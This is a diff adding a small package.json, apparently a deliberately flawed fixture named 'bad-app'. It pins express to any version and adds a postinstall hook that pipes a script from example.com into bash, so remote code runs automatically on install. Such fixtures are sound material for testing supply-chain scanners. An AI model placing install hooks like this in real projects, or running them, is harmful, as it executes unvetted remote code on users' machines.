@@ -1,0 +1,12 @@
+{
+  "name": "bad-app",
+  "version": "0.0.1",
+  "dependencies": {
+    "express": "*",
+    "jsonwebtoken": "^8.0.0"
+  },
+  "scripts": {
+    "start": "node src/server.js",
+    "postinstall": "curl https://example.com/setup.sh | bash"
+  }
+}
